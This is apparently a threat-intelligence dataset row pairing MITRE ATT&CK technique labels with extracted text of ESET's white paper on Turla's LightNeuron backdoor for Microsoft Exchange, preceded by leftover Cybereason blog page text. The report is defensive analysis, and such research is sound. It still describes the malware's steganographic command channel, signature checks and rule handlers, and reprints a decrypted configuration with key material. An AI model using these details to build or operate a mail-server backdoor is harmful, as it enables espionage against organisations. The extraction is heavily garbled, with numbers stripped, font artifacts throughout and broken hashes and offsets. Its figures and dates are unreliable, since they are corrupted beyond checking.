unknown system vulnerabilities  The Cybereason Nocturnus Team was the first to release a vaccination for the       MALWARE_NAME  and  MALWARE_NAME  cyberattacks  All Posts by Cybereason Nocturnus Related Posts Operation GhostShell  Novel RAT Targets Global Aerospace and Telecoms Firms The highly targeted attacks against aerospace and telecoms firms by new Iranian threat actor MalKamak includes newly discovered malware that evaded security tools since      and abuses Dropbox services for command and control    THREAT ANALYSIS REPORT  All Paths Lead to  MALWARE_NAME     MALWARE_NAME    MALWARE_NAME  and  MALWARE_NAME  The Cybereason GSOC delivers details on three recently observed attack scenarios where fast moving malicious actors used the malware loaders  MALWARE_NAME    MALWARE_NAME  and  MALWARE_NAME  to deploy the  MALWARE_NAME  framework on the compromised systems    Subscribe Never miss a blog  Latest from Our CEO Series Recent Posts Malicious Life Podcast  Hackers vs  Spies   The Stratfor Leaks Part   June          How AI Driven XDR Defeats Ransomware June          Defending Against the Five Stages of a Ransomware Attack June          Categories Research Podcasts Webinars Resources Videos News All Posts Related Posts Operation GhostShell  Novel RAT Targets Global Aerospace and Telecoms Firms The highly targeted attacks against aerospace and telecoms firms by new Iranian threat actor MalKamak includes newly discovered malware that evaded security tools since      and abuses Dropbox services for command and control    THREAT ANALYSIS REPORT  All Paths Lead to  MALWARE_NAME     MALWARE_NAME    MALWARE_NAME  and  MALWARE_NAME  The Cybereason GSOC delivers details on three recently observed attack scenarios where fast moving malicious actors used the malware loaders  MALWARE_NAME    MALWARE_NAME  and  MALWARE_NAME  to deploy the  MALWARE_NAME  framework on the compromised systems    NEWSLETTER Never miss a blog Get the latest research  expert insights  and security industry news  Subscribe About Who We Are Careers Leadership Contact Resources Blog Case Studies Webinars White Papers Platform Overview Endpoint Protection EDR MDR  Cybereason       All Rights Reserved  Terms of Use Privacy Notice Security ,[]
https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf,"['enterprise-attack', 'Enterprise']",['persistence'],"['Transport Agent', 'Application Layer Protocol: Mail Protocols', 'Archive Collected Data', 'Automated Collection', 'Automated Exfiltration', 'Command and Scripting Interpreter: Windows Command Shell', 'Data from Local System', 'Data Manipulation: Transmitted Data Manipulation', 'Data Obfuscation: Steganography', 'Data Staged: Local Data Staging', 'Deobfuscate/Decode Files or Information', 'Email Collection: Remote Email Collection', 'Encrypted Channel: Symmetric Cryptography', 'Exfiltration Over C2 Channel', 'Indicator Removal on Host: File Deletion', 'Ingress Tool Transfer', 'Masquerading: Match Legitimate Name or Location', 'Native API', 'Obfuscated Files or Information', 'Scheduled Transfer', 'Server Software Component: Transport Agent', 'System Information Discovery', 'System Network Configuration Discovery']","['T1505', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016']",TURLA  MALWARE_NAME  One email away from remote code execution ESET Research White papers    May      Matthieu Faou TABLE OF CONTENTS    Executive summary                                    Attacker profile                                         Publicized high profile attacks                          Victimology                                         Tools and tactics                                   Overview                                             Impact                                             Chronology                                         Targeting                                           Attribution to Turla                                  Insight into attackers activity                           Malware                                             Microsoft Exchange architecture                        Malicious Transport Agent                              Companion Dynamic Link Library                        Evolution                                        Linux variant                                     Remediation                                            Cleaning                                          Mitigations                                       Conclusion                                           Bibliography                                           IoCs                                                  Hashes                                          Paths                                           MITRE ATT CK techniques                              LIST OF TABLES Table   Description of the handlers implemented in the DLL    Table   Handler return codes and their descriptions    Table   List of instruction codes    Table   Description of the log files    LIST OF FIGURES Figure   Timeline of important attacks attributed to Turla   Figure    MALWARE_NAME  timeline   Figure   Map of known  MALWARE_NAME  victims   Figure   Operators working hours   Figure   Distribution of the backdoor commands used by the operators   Figure   Microsoft Exchange architecture    Figure   Classes implemented by the Transport Agent    Figure   PowerShell script to install the malicious Transport Agent    Figure   SmtpReceiveAgent implementation    Figure    Process function    Figure     MALWARE_NAME  Transport Agent    Figure    Some decrypted strings    Figure    Partially redacted  decrypted configuration example    Figure    Redacted example of a rule file    Figure    Decompilation output of the zip handler function    Figure    Original email  on the left  and email after the call to changeSubject  on the right     Figure    Attachment type check  HexRays output     Figure    Extraction of the container data from the PDF  HexRays output     Figure    Representation in hexadecimal of a PDF containing a container    Figure    Modified PDF document with embeded commands for  MALWARE_NAME  Snake is another name for Turla    Figure    Validation of the JPG signature  HexRays output     Figure    Modified JPG picture with embedded commands for  MALWARE_NAME     Figure    Hexadecimal dump of an encrypted container    Figure    Hexadecimal dump of a decrypted container    Figure    Structure of the command container  C like syntax     Figure    Example of an email generated by  MALWARE_NAME  to send command output    Figure    Log entry structure in C like syntax    Figure    Exfiltration loop with night check  HexRays output     Figure    Exfiltration loop  HexRays output     Figure    Linux strings in the Windows DLL    Figure    agents config example    Turla  MALWARE_NAME  One email away from remote code execution     EXECUTIVE SUMMARY Turla  also known as Snake  is one of oldest  still active cyberespionage groups  with more than a decade of experience  Its operators mainly focus on high profile targets such as governments and diplomatic entities in Europe  Central Asia and the Middle East  They are known for having breached major organiza   tions such as the US Department of Defense in      and the Swiss defense company RUAG in       More recently  several European countries including France and the Czech Republic went public to denounce Turla s attacks against their governments  To perform these operations  Turla s operators own a large arsenal of malware including a rootkit  several complex backdoors  with a notable one for Microsoft Outlook   and a large range of tools to pivot on a network  In this white paper  we present the analysis of  MALWARE_NAME   a backdoor specifically designed to target Microsoft Exchange mail servers  Key points in this white paper    Turla is believed to have used  MALWARE_NAME  since at least          MALWARE_NAME  is the first publicly known malware to use a malicious Microsoft Exchange Transport Agent     MALWARE_NAME  can spy on all emails going through the compromised mail server     MALWARE_NAME  can modify or block any email going through the compromised mail server     MALWARE_NAME  can execute commands sent by email    Commands are hidden in specially crafted PDF or JPG attachments using steganography      MALWARE_NAME  is hard to detect at the network level because it does not use standard HTTP S  communications     MALWARE_NAME  was used in recent attacks against diplomatic organizations in Eastern Europe and the Middle East  For any inquiries  or to make sample submissions related to this white paper  contact us at  threatintel eset com  Turla  MALWARE_NAME  One email away from remote code execution     ATTACKER PROFILE Turla  also known as Snake  is an infamous espionage group active for at least a decade  The group is well known for its advanced custom tools and its ability to run highly targeted operations      Publicized high profile attacks Over the past ten years  Turla has been responsible for numerous high profile breaches  The targets include the United States Central Command in           the Swiss military company RUAG in          and more recently  the French Armed Forces in           The timeline in Figure   presents some of the major attacks attributed to Turla   two tnum lnum zero pnum lnum zero pnum lnum eight pnum lnum US Central Command two tnum lnum zero pnum lnum one pnum lnum three pnum lnum Finnish Foreign Ministry two tnum lnum zero pnum lnum one pnum lnum four pnum lnum RUAG Defense Company  two tnum lnum zero pnum lnum one pnum lnum seven pnum lnum German Foreign O ce two tnum lnum zero pnum lnum one pnum lnum eight pnum lnum French Armed Forces Figure      Timeline of important attacks attributed to Turla     Victimology As opposed to some other APT  Advanced Persistent Threat  groups  Turla is far from being opportunistic in the selection of its targets  The group is interested in collecting information from strategic people or organizations  In addition  to our knowledge  Turla has never conducted cybersabotage operations  such as those made by  MALWARE_NAME      or TeleBots      With several years of tracking this espionage group  we have identified the most at risk types of organizations    Ministries of Foreign Affairs and diplomatic representations  embassies  consulates  etc     Military organizations   Regional political organizations   Defense contractors Most parts of the world are targeted by Turla s operations  with the exception  perhaps  of Eastern Asia  Moreover  over the past few years  we have noticed that geographical areas of conflict  such as Eastern Europe and the Middle East  are under heavy attacks from this APT group  However  even with this new focus  they did not abandon their traditional targets in Western Europe and Central Asia      Tools and tactics The usual modus operandi used by Turla s operators is to use basic first stage malware for initial recon   naissance  In some cases they even use generic tools such as Metasploit          Once they deem the victim interesting enough  they switch to more advanced malware such as  MALWARE_NAME      or  MALWARE_NAME       The initial compromise is generally tailored towards specific types of victims  In the past  they mainly relied on spearphishing emails       watering hole attacks      or Man in the Middle attacks       After this initial compromising step  they move laterally on the network and collect many credentials  To avoid suspicious communications to the internet  they developed tools such as DarkNeuron      and RPCBackdoor  to forward commands and exfiltrate data on the local network  They also regularly create user accounts that they use later if they lose access to a compromised machine  It means that once compro   mised  it is very hard to eject the attacker from the network without rebuilding most of it  Finally  collected data is exfiltrated through various channels such as HTTP and emails  They usually rely on compromised web servers as first stage servers  They are also known for using SATCOM IP addresses to hide the real destination of the traffic       Turla  MALWARE_NAME  One email away from remote code execution  Turla s operators have a wide arsenal at their disposal for all major desktop platforms  Windows  macOS and Linux  Some of their tools stand out for their complexity  such as the Snake rootkit  which relies on a vulnerable VirtualBox driver to bypass Windows Driver Signature Enforcement       Some others stand out by their originality  such as the Outlook backdoor we analyzed in            During our several years of tracking Turla activities  we also noticed that they were reacting quickly to both publication and detection  Apparently  they do not hesitate to clean all the traces and potentially lose control of a machine if they feel they will be detected soon  They probably do not want their more advanced malware to be exposed publicly     OVERVIEW  MALWARE_NAME  is a piece of malware specifically designed to target Microsoft Exchange servers  It has two facets  spying on emails and acting as a full feature backdoor      Impact While rootkits and bootkits have an unmatched stealthiness in the malware domain   MALWARE_NAME  is uncom   monly stealthy for  regular  malware  To our knowledge  leveraging a Microsoft Exchange Transport Agent for persistence is something unique and never before seen  Moreover  in the few cases we studied  Light   Neuron was running with SYSTEM privileges  It is typically hard to gain this level of privilege on a Microsoft Exchange server  as it is one of the most critical assets in an organization  Thus  once compromised  it is likely that it will stay undetected for months or years  The Command and Control protocol is fully based on emails and uses steganography to store data in PDF and JPG attachments  Given that  in the Microsoft Exchange architecture  the malware is installed at the same level as anti spam and other email security solutions  it allows the malware to bypass them easily  Using a nearly undetectable Command and Control channel allows the malware to stay under the radar for a long period  During the course of our investigation  we noticed alongside  MALWARE_NAME  the presence of several tools used to control other machines on the local network  These tools include Remote Administration Software  RPC  based malware or  NET web shells targeting Outlook Web Access  By leveraging them  attackers are able to control other machines on the local network using emails sent to the Exchange server  This strategy allows avoiding typical  noisy methods such as an HTTP based C C protocol or connection via RDP from outside the compromised network      Chronology We believe that  MALWARE_NAME  development started before      as the versions compiled in       according to the compilation timestamp  appear to be in a late development state  Even if the development occurred several years ago   MALWARE_NAME  is still used in recent compromises  Figure   is a timeline of some important events related to  MALWARE_NAME    two tnum lnum zero pnum lnum one pnum lnum four pnum lnum June Oldest compilation timestamp  two tnum lnum zero pnum lnum one pnum lnum  October Most recent compilation timestamp  two tnum lnum zero pnum lnum one pnum lnum seven pnum lnum May Compromise of an organization in the Middle East  two tnum lnum zero pnum lnum one pnum lnum  October Compromise of an organization in Eastern in Europe Figure       MALWARE_NAME  timeline Turla  MALWARE_NAME  One email away from remote code execution      Targeting These targets are in line with traditional Turla targets  Figure   shows the geographical location of the identified targets  The Eastern European and Middle East targets are diplomatic organizations  Regarding the Brazilian target  the sample was uploaded to VirusTotal  Thus  we cannot know the exact nature of the victim or even be sure that the victim was based in Brazil  Brazil Unknown organization Eastern Europe Ministry of Foreign A airs Middle East Regional Diplomatic organization Figure      Map of known  MALWARE_NAME  victims     Attribution to Turla We believe with high confidence that Turla operates  MALWARE_NAME   The following artefacts we collected during our investigation back this    On one compromised Exchange server    A PowerShell script containing malware previously attributed to Turla was dropped    minutes before a PowerShell script used to install  MALWARE_NAME     Both scripts were located in C  windows system       The script used to install  MALWARE_NAME  has a filename msinp ps  that looks like typical filenames used by Turla    On another compromised server  we saw a sample of the IntelliAdmin Remote Administration Tool  packed with a packer used only by Turla  being dropped by  MALWARE_NAME     For each  MALWARE_NAME  attack  we found several other instances of Turla malware on the same network    The email address used by the attackers was registered at GMX and was impersonating an employee of the targeted organization  This same provider was used for the Outlook backdoor      and for a previously undocumented PowerShell backdoor we have dubbed  MALWARE_NAME     Kaspersky Labs researchers attribute  MALWARE_NAME   with medium confidence  to Turla       Turla  MALWARE_NAME  One email away from remote code execution      Insight into attackers activity While analyzing a compromised asset  we were able to retrace part of the attackers  activities  In particular  we were able to map the working hours of the operators  using the time at which the compromised Exchange server received emails containing commands for the backdoor  Our first observation is that the activity matches well a typical   to   workday in the UTC   time zone  as shown in Figure     three pnum lnum zero pnum lnum  two pnum lnum zero pnum lnum  one pnum lnum zero pnum lnum  zero pnum lnum  two pnum lnum four pnum lnum six pnum lnum eight pnum lnum one pnum lnum zero pnum lnum one pnum lnum two pnum lnum one pnum lnum four pnum lnum one pnum lnum six pnum lnum one pnum lnum eight pnum lnum two pnum lnum zero pnum lnum zero pnum lnum UTC   three pnum lnum timezoneUTC timezone HourNumber of email received Figure      Operators working hours Our second observation is that no activity was observed between December          and January           while previously and afterwards  the attackers sent several emails per week  This break in activities corresponds to holidays around the Orthodox Christmas  Even if it is not sufficient for a strong attribution  one might correlate these two observations with other artefacts used for attribution  We also compiled the type of commands used by the attackers  as shown in Figure    Even if we were not able to retrieve the command arguments  it is already a good insight into the operators  goals  It turns out that  MALWARE_NAME  is used mostly to exfiltrate data  The remaining activity is most likely dropping and executing tools to perform lateral movements across the local network  Turla  MALWARE_NAME  One email away from remote code execution  Ex ltrate a  le Execute a command line Drop a  le and execute it Figure      Distribution of the backdoor commands used by the operators    MALWARE Two main components comprise  MALWARE_NAME   a Transport Agent       registered in the Microsoft Exchange configuration  and a companion    bit Dynamic Link Library  DLL  containing most of the malicious code      Microsoft Exchange architecture Microsoft Exchange allows extending its functionalities using Transport Agents that can process and modify all email messages going through the mail server       Transport Agents can be created by Microsoft  third party vendors  or directly within an organization  They have many legitimate purposes  such as    Filtering spam   Filtering malicious emails attachments   Adding a corporate signature at the end of every email The typical events handled by a Transport Agent occur when the mail server sends or receives an email  Before the event is actually executed  the Transport Agents are called and have the possibility to modify or block the email  Figure   shows the typical workflow in a Microsoft Exchange server  It also shows where the malicious Transport Agents are inserted in this flow  Turla  MALWARE_NAME  One email away from remote code execution   Protocol Agents  MALWARE_NAME  SMTP Receive Agent Pickup   Replay directoriesRouting Agents  MALWARE_NAME  Routing AgentProtocol Agents Hub Selector SMTP from the Transport service or the Mailbox Transport service on other Mailbox Servers FROM SMTP to the Transport service or the Mailbox Transport service on other Mailbox Servers TO Submission QueueDelivery Queue Front End Transport Service Transport ServiceClient Access Server Mailbox Server Mailbox Transport Submission serviceMailbox transport Delivery serviceCategorizerSMTP Receive SMTP Receive SMTP Receive Mailbox Assistants Mailbox Submit AgentsStore Driver Submit Mailbox deliver Agents Mailbox Transport Service SMTP to the Transport service on other Mailbox Servers FROM SMTP to the Transport service on other Mailbox Servers TO Store Driver Deliver Hub SelectorSMTP SendExternal SMTP SMTP SMTP Send SMTP SMTP Send SMTP RPCRPC Mailbox database Figure      Microsoft Exchange architecture  original picture  https   docs microsoft com en us exchange mail flow exchange      help   In order to register a Transport Agent to a Microsoft Exchange Installation  one could modify the list of agents in  ExchangeInstallFolder  TransportRoles Agents agents config   The PowerShell function Install TransportAgent is another way to register a new Transport Agent  Turla  MALWARE_NAME  One email away from remote code execution       Malicious Transport Agent This component is responsible for communicating with Microsoft Exchange and with the main malicious DLL  To our knowledge  this is the first time a Transport Agent has been used for malicious purposes  Identification The malicious Transport Agent is a    bit Windows DLL developed in  NET  Our analysis is based on the sample with SHA    C   E   FBF  A  E DAE F  EEE   B   DB C   apparently compiled on             In Figure    you can see the seven different classes used by the malicious Transport Agent  Common utl is the class used to process the email and call the second DLL  ContentFilterAgent and SecurityInteropAgent are  respectively  inheriting from the standard base classes RoutingAgent and SmtpReceiveAgent   Figure      Classes implemented by the Transport Agent Installation The attackers drop this executable in the Exchange folder located in the Program Files folder  This first step requires Administrative privileges  Then  they execute the script in Figure   to register the DLL as a Transport Agent  This second step is required before the malware starts receiving events from Exchange  Figure      PowerShell script to install the malicious Transport Agent Turla  MALWARE_NAME  One email away from remote code execution   Functions This Transport Agent implements two classes  SmtpReceiveAgent and RoutingAgent   These classes inherit from standard Microsoft Exchange classes  allowing them to receive events from the mail server  Figure   shows a part of the class implementing SmtpReceiveAgent   Figure      SmtpReceiveAgent implementation One of the events registered is EndofData   which the server calls once it has received the entire email  This event s callback then calls the Process function  The behavior is the same for all the callbacks  The class common utl contains the Process function  As shown in Figure     it first logs the date and the sender of the email  Then  it calls the CheckMessage function that then calls the companion DLL to process email data  Finally  depending on the return value of CheckMessage   it does nothing  modifies the email  or blocks it  Turla  MALWARE_NAME  One email away from remote code execution   Figure       Process function Figure    summarizes the behavior of the  MALWARE_NAME  Transport Agent  A detailed explanation of the behavior of the companion DLL is available in the Backdoor section   Turla  MALWARE_NAME  One email away from remote code execution   Internal Email Microsoft Exchange Transport Agent  one pnum lnumLightNeuron Transport Agent Log date and Sender Call the companion DLL to process the email Transport Agent n Block the email Execute a commandModify the emailDo nothingExternal Email Figure        MALWARE_NAME  Transport Agent     Companion Dynamic Link Library This second component implements most of the malicious functions that are needed by the Transport Agent  Identification The companion DLL is a    bit Windows DLL developed in C  Our analysis is based on the sample with SHA     EE    A C   CBEB A    A EC  C  B E  F    apparently compiled on             This DLL exports three functions    FL  aka ForLoading   return       BLE  aka BinaryLogEx   Log input data in a log file   SV  aka SimpleValidate   Process an email The exports  full names were present in the oldest versions of the DLL  while in the most recent one  they were shortened  Initialization When the Transport Agent loads the DLL  the DLL s main function performs various initialization tasks  First  it decrypts  using an XOR operation  most of the strings with the hardcoded key  xA    Figure    shows some interesting strings once decrypted  Turla  MALWARE_NAME  One email away from remote code execution   Figure       Some decrypted strings Then  it decrypts the configuration file stored in  tmp  winmail dat   Microsoft Outlook uses the same filename when people send messages from an incorrectly configured mail client       We believe they choose this filename to hide their configuration file in plain sight as a Microsoft Exchange administrator might be accustomed to see many legitimate files named winmail dat   The configuration is encrypted with AES      with the first    bytes of the file being the RSA encrypted AES key  The      bit RSA private key is hardcoded in the binary and it uses the mode PKCS  v    for encryption  Figure    is an example of a decrypted configuration  Please note that we have redacted some confidential information  Turla  MALWARE_NAME  One email away from remote code execution    Parameters  CONFIG FILE NAME  c  Windows ServiceProfiles NetworkService appdata Local Temp msmocf xml LOG LEVEL    DEBUG LOG FILE NAME  c  Windows ServiceProfiles NetworkService appdata Local Temp msmodl  dat CRYPT KEY  LS tLS CRUdJTiBQVUJMSUMgS VZLS tLS KTUlHZk BMEdDU FHU liM RRRUJBUVVBQTRH TkFEQ JpUUtCZ FDOG zc g UDJpa  YMnpBOFg dUpNcmxRWApkM  Pc VvcWRpa pzQ l TlJCNXc RVl jeHRQYVdubEc L hCeC IMG  cnZyelFVamxCa dieDY L tSclhVCmZ MkE RGk NTZldlExMHZPVHlBcH RualMvRWtBKzFUUGRPSTdkZWcrakNpaDFMNk TNUJFTyszTTN aGZrVzcKZVU ZUdkcVZyeWdiOWV amxRS URBUUFCCi tLS tRU EIFBVQkxJQyBLRVktLS tLQo  DECRYPT KEY  LS tLS CRUdJTiBSU EgUFJJVkFURSBLRVktLS tLQpNSUlDWFFJQkFBS JnUURRTWdoRS  sUlBpbGNNTXFqb RSMDBJcU wWkovalFuT kwZzFTRXJ dytaQ tqUit CmRZSHo bUVNTXJmbS uYnZkV  hRQUxubERpSlNwOHRpa VHdHdJajFrV  aQ ppangvazhHWWdoNHZkZmtCSkcKbmlnQnJTMTliSktqMzh  eElGVWI NGQwK hISlczdld VVJFYUhwZjVFemdmQmdIZ ZIN NzaVE UUlEQVFBQgpBb dCQUlLMkJzOGF SbUN NERqK RXR JtS cwMnZaMy wSTJGRmV UFQyOEdTN hZTWc RmhsWFgwRjc STR CkFaZjdSenpNSD dPcTRRdFlObUJpaktUVXh Nm rYk MajQxVWhYQks YUl S oxa lKUG rY RVUERWWjN WmkKS lKZ lje DI SEozbXF T  mZTczVElKcEsybDZFRkVDUDJkaTg aHNZTFhsa s QWtFQTcwRGxlMDROMVBIeAozUzBj WkhFQm ZNnhyNElvUGJSQmZ Wkd NHEyZWs ZjVldG idjVvck  WnE QUpzRkJsOWhBZFIxUE rdUk Ckl  WnVGRzhvM dKQkFON VuZWpNQ  Td FEdlhvSWxBMElFVkd RlNIcHp TDFBWW FSFVhNXZpOFR VC KYV kKN pSSFNwNUxZeExLZkh MGovWExBVFo a oxVDNkaWpDcnNDUUdlMk RUC kTjEvTjhJUndRSUZQcGpDM jJGaQpRWUZsOXhKTFBhSm mZXVOSnR cTdBOW Od JmeWZzNmxyaVlVV FWMTZ SXVDdG FT RlR  rL kr OENRQnlsCjFGalh RnIxek  Rk oUDBqZHZMeHcxbDdpSG UNVZSVldxaDBxVGRib Jlc tEOVViQTc dEN vaVRrbGFSVDQKcm yQmZJcHhZNWtYYS Rc kza NRUUMzeS wVUdRK J MDhJczBmcTBSQmNmaG zYXREen djWjRZS cwc NXVgpxeXNjdTZBd hvaGdjZEN UGJiNDJYcnZIamFmbTZYYk  aXFnU lqc JuRgotLS tL UVORCBSU EgUFJJVkFURSBLRVktLS tLQo  LOG OUTPUT  c  Windows ServiceProfiles NetworkService appdata Local Temp  MIN SIZE TO ZIP       ZIP FILE NAME  c  Windows ServiceProfiles NetworkService appdata Local Temp tmpE BC CONFIG UPDATE INTERVAL      DEBUG LOG CRYPT   STAT INTERVAL   STAT PATH  c  Windows ServiceProfiles NetworkService appdata Local Temp tmpD  BC SEND FROM  redacted noreply  redacted  COMMAND REPLY SUBJECT  Email confirmation COMMAND REPLY ATTACH NAME  Letter   redacted   prnt    Note  Instruction  List  Scanned  Untitled  report  filename  ATT       ticket  Form  Attachment  Information   Parameters  Figure       Partially redacted  decrypted configuration example The configuration does not necessarily specify all the possible parameters  Some parameters  such as CRYPT KEY  have their default values hardcoded in the DLL  which could be used in case none is specified in the winmail dat file  The different configuration parameters handled by the sample we analyzed are    COMMAND REPLY ATTACH NAME   COMMAND REPLY SUBJECT   CONFIG FILE NAME   CONFIG UPDATE INTERVAL   CRYPT KEY   DEBUG LOG FILE NAME   DECRYPT KEY   LIMITS MAILS PER SECOND   LIMITS MAILS PER SECOND REFRESH INTERVAL   LIMITS MEMORY LOAD   LIMITS MEMORY LOAD REFRESH INTERVAL   LOG LEVEL   LOG OUTPUT Turla  MALWARE_NAME  One email away from remote code execution     MIN SIZE TO ZIP   POSTFIX INCOMING PATH   SEND AT NIGHT   SEND FILE   SEND FROM   SEND NEW MAIL LOCAL RECIPIENT   SEND NEW MAIL LOGIN   SEND NEW MAIL MODE   SEND NEW MAIL PASS   SEND NEW MAIL PORT   SEND NEW MAIL SERVER   SEND TIME   SEND TO   STAT INTERVAL   STAT PATH   TMP ID PATH   USE TEMPLATE   ZIP FILE NAME While most of the parameter names are self explanatory  an interesting one is CONFIG FILE NAME  This second configuration file contains the rules used to process the emails  We detail this behavior in the next section  Rules and handlers In our example  the rules are defined in c  Windows ServiceProfiles NetworkService appdata  Local Temp msmocf xml   This file is encrypted in a similar way as winmail dat and the RSA private key is defined in the configuration parameter DECRYPT KEY  Once decrypted  this is an XML file describing rules  as shown in Figure     It contains several class nodes  each one corresponding to a different function  aka handler  implemented in the DLL  Each class node contains a set of rules describing conditions using the logical operators AND and OR  In addition  each conditional node has three parameters    The field to which the condition applies   The condition  cnt for contains and  cnt for does not contain   The value that is compared to the field value Finally  at the end of the file is the mapping of the class names with the name of the functions in the DLL  Turla  MALWARE_NAME  One email away from remote code execution    class name  zip  metric      id     dllName  ZipMe  type  dll  include       rule metric      id     include       and   or   To condition  cnt  value  email   redacted       From condition  cnt  value  email   redacted       To condition  cnt  value  email   redacted       From condition  cnt  value  email   redacted              or   and   To condition   cnt  value  email   redacted       From condition   cnt  value  email   redacted              and    and    rule    class   class name  command  metric      id     dllName  ZipMe  type  dll  include       rule metric      id     include       attachment Content Type condition  cnt  value  image jpeg       rule    class  log logHandler zip zipHandler changeSubject changeSubjectHandler changeBody changeBodyHandler create createHandler command commandHandler block blockHandler replace replaceHandler stat statHandler Figure       Redacted example of a rule file These rules are applied to every email processed by the DLL  Thus  the behavioral characteristics of  MALWARE_NAME  reside in this configuration file  This configuration is highly flexible  allowing it to perform different actions depending on various fields of the email  For example  it is possible to collect all the emails sent by one particular email address  Moreover  the operators customize the rules for each victim  In the sample we analyzed  all the email addresses contained in the rules belonged to the targeted organization  In one case  they were monitoring around thirty different email addresses  which probably were the people about whom they were the most interested in collecting information  There are eleven different handlers implemented in the DLL and described in Table    Table   Description of the handlers implemented in the DLL Handler nameDescription block Block the email changeBody Change the body of the email changeTo Change the recipient of the email changeSubject Change the subject of the email command Parse the JPG PDF attachment  decrypt and execute the commands  This is described in detail in the Backdoor section create Create a new email log Log email attachment in LOG OUTPUT Turla  MALWARE_NAME  One email away from remote code execution   Handler nameDescription replace Replace the attachment spam Re create and re send the email from the exchange server to bypass the spam filter stat Log From  Date  To  Subject in STAT PATH in CSV format zip Encrypt the email with RSA and store it in the path specified by ZIP FILE NAME  All the handlers are implemented in the same way  In the arguments  there is the email in the form of a linked list with the different fields parsed  From  To  body  etc    The handler can modify this linked list and will return a code corresponding to the action it performed  as listed in Table    Table   Handler return codes and their descriptions Return ValueDescription  No modification  Email modified  Block the email  Error  Contains  NET assembly Then  the Transport Agent interprets this return code to know if it should modify the email  block it or execute  NET assembly code  Figure    is the handler function for zip  Interestingly  it will dump  encrypt the email and store it on disk but does not compress it  We believe these files are sent back to the attackers using a backdoor command  Figure       Decompilation output of the zip handler function Some handlers  such as changeSubject   were not used in the rules we analyzed  However  by creating a new set of rules  we were able to trigger this handler  The modification is easily noticed  as you can see in Figure     Other handlers  such as changeBody or changeTo   might be used to hide some information or to redirect emails  Turla  MALWARE_NAME  One email away from remote code execution   Figure       Original email  on the left  and email after the call to changeSubject  on the right  Backdoor The command handler is actually the implementation of a backdoor controlled by email  It has the following properties    Depending on the rules  the commands are hidden in a PDF or a JPG attachment    It uses steganography to hide data in PDF documents or JPG pictures    The email is blocked so it will not be delivered to the final recipient  Although this may sound very similar to the Turla Outlook backdoor controlled by PDF attachments that we analyzed in            the format of the attachment is quite different  Thus  we believe a different programmer or team developed it  As shown in the configuration example  the rule to execute the command handler applies to every attachment of type image jpeg going through the Exchange server  It is not very efficient  as most of the images do not contain commands  As an example  for one victim  the command handler processed around      pictures while only     actually contained commands for the backdoor  Every time the handler is called  it will first check whether the attachment is a PDF document or a JPG image  as shown in Figure     Figure       Attachment type check  HexRays output  Turla  MALWARE_NAME  One email away from remote code execution   PDF In the case of a PDF document  the routine first checks for a signature by performing XOR operations with the data from offset  x B to offset  x    One way to satisfy this signature condition is by setting all the values from offset  x B to  x   to  x    If the previous signature is satisfied  the routine reads the offset of the blob of data containing the command  which we call the container  from offset  x    It also reads the size of the container from offset  x    Finally  it copies the container data  Figure    shows these operations  Figure       Extraction of the container data from the PDF  HexRays output  A visualization in a hexadecimal editor of the different fields is shown Figure     Figure       Representation in hexadecimal of a PDF containing a container This PDF  which was modified to embed a command  is still valid as you can see in Figure     Figure       Modified PDF document with embeded commands for  MALWARE_NAME   Snake is another name for Turla  Turla  MALWARE_NAME  One email away from remote code execution   JPG In case of a JPG image  it first computes a signature using    bytes from the first quantization table  The quantization table is a part of the JPG format and contains data used during the compression of the picture  It performs several XOR operations on these    bytes and compares the result against a hardcoded signature  as shown in Figure     Figure       Validation of the JPG signature  HexRays output  We can view these multiple XOR     operations on the input  followed by a comparison  as a set of mathematical equations  input  zero pnum lnum input  four pnum lnum    two pnum lnum five pnum lnum zero pnum lnum input  one pnum lnum input  five pnum lnum    one pnum lnum six pnum lnum input  two pnum lnum input  six pnum lnum    eight pnum lnum two pnum lnum input  three pnum lnum input  seven pnum lnum    one pnum lnum four pnum lnum five pnum lnum input  zero pnum lnum input  one pnum lnum zero pnum lnum    four pnum lnum zero pnum lnum input  one pnum lnum input  one pnum lnum one pnum lnum    two pnum lnum one pnum lnum nine pnum lnum input  two pnum lnum input  one pnum lnum two pnum lnum    two pnum lnum one pnum lnum three pnum lnum input  three pnum lnum input  one pnum lnum three pnum lnum    one pnum lnum seven pnum lnum six pnum lnum Once we have the set of equations  we can easily solve it manually or use a SMT  Satisfiability Modulo Theories  solver such as Microsoft Z       to find out whether a solution exists and  if so  to find one possible solution  It turns out this set of equations is solvable and we use the solution to create a JPG image that can pass the check  If the previous equation is satisfied  it gets the length of the container from offset  x F of the quantization table  Finally  it extracts the container from the last Start of Scan section  another standard field of the JPG format  By modifying the quantization table  the resulting picture is also affected  However  the image is still valid  as shown in Figure     Turla  MALWARE_NAME  One email away from remote code execution   Figure       Modified JPG picture with embedded commands for  MALWARE_NAME  Container and command execution Regardless of the attachment type delivering it  the container format is strictly identical  The first four bytes are the size of the container and the following bytes are encrypted with AES     with a key hardcoded in the binary  Figure    shows an example of an encrypted container  Figure       Hexadecimal dump of an encrypted container 